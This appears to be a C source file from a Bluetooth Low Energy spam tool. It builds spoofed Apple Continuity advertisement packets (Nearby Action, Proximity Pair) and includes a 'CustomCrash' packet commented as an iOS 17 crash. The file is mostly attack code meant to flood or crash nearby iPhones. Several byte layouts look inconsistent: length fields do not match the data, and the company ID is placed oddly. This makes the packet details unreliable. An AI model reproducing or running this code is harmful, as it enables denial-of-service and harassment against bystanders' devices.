#include "continuity.h"
#include <string.h>

const char* continuity_get_type_name(ContinuityType type) {
    switch(type) {
        case ContinuityTypeAirDrop: return "AirDrop";
        case ContinuityTypeAirplayTarget: return "AirplayTarget";
        case ContinuityTypeHandoff: return "Handoff";
        case ContinuityTypeTetheringSource: return "TetheringSource";
        case ContinuityTypeNearbyAction: return "NearbyAction";
        case ContinuityTypeNearbyInfo: return "NearbyInfo";
        case ContinuityTypeProximityPair: return "ProximityPair";
        case ContinuityTypeCustomCrash: return "CustomCrash";
        default: return "Unknown";
    }
}

uint8_t continuity_get_packet_size(ContinuityType type) {
    switch(type) {
        case ContinuityTypeNearbyAction:
        case ContinuityTypeProximityPair:
        case ContinuityTypeCustomCrash:
            return 27; // Standard size for these types
        default:
            return 27; // Default size
    }
}

void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
    switch(msg->type) {
        case ContinuityTypeNearbyAction: {
            // Nearby Action packet structure
            packet[0] = 0x04; // Length
            packet[1] = 0x04; // Type (Nearby Action)
            packet[2] = msg->data.nearby_action.flags;
            packet[3] = msg->data.nearby_action.type;
            packet[4] = 0x00; // Padding
            packet[5] = 0x00;
            packet[6] = 0x0f;
            packet[7] = 0x05;
            packet[8] = 0xc0;
            packet[9] = 0x02;
            packet[10] = 0x60;
            packet[11] = 0x4c; // Apple company ID (little endian)
            packet[12] = 0x00;
            // Fill remaining bytes with zeros
            for(int i = 13; i < 27; i++) {
                packet[i] = 0x00;
            }
            break;
        }
        
        case ContinuityTypeProximityPair: {
            // Proximity Pair packet structure
            packet[0] = 0x07; // Length
            packet[1] = 0x19; // Type (Proximity Pair)
            packet[2] = 0x05; // Subtype
            packet[3] = 0x00; // Flags
            packet[4] = msg->data.proximity_pair.prefix;
            packet[5] = (msg->data.proximity_pair.model >> 8) & 0xFF; // Model high byte
            packet[6] = msg->data.proximity_pair.model & 0xFF; // Model low byte
            packet[7] = 0x00; // Padding
            packet[8] = 0x00;
            packet[9] = 0x00;
            packet[10] = 0x00;
            packet[11] = 0x00;
            packet[12] = 0x00;
            packet[13] = 0x00;
            packet[14] = 0x00;
            packet[15] = 0x00;
            packet[16] = 0x00;
            packet[17] = 0x00;
            packet[18] = 0x00;
            packet[19] = 0x00;
            packet[20] = 0x00;
            packet[21] = 0x00;
            packet[22] = 0x00;
            packet[23] = 0x00;
            packet[24] = 0x00;
            packet[25] = 0x00;
            packet[26] = 0x00;
            break;
        }
        
        case ContinuityTypeCustomCrash: {
            // Custom Crash packet structure (iOS 17 crash)
            packet[0] = 0x04; // Length
            packet[1] = 0x04; // Type
            packet[2] = 0x20; // Flags
            packet[3] = 0x00; // Subtype
            packet[4] = 0x00; // Padding
            packet[5] = 0x00;
            packet[6] = 0x0f;
            packet[7] = 0x05;
            packet[8] = 0xc0;
            packet[9] = 0x02;
            packet[10] = 0x60;
            packet[11] = 0x4c; // Apple company ID
            packet[12] = 0x00;
            // Fill remaining bytes with zeros
            for(int i = 13; i < 27; i++) {
                packet[i] = 0x00;
            }
            break;
        }
        
        default:
            // Default packet structure
            for(int i = 0; i < 27; i++) {
                packet[i] = 0x00;
            }
            break;
    }
}
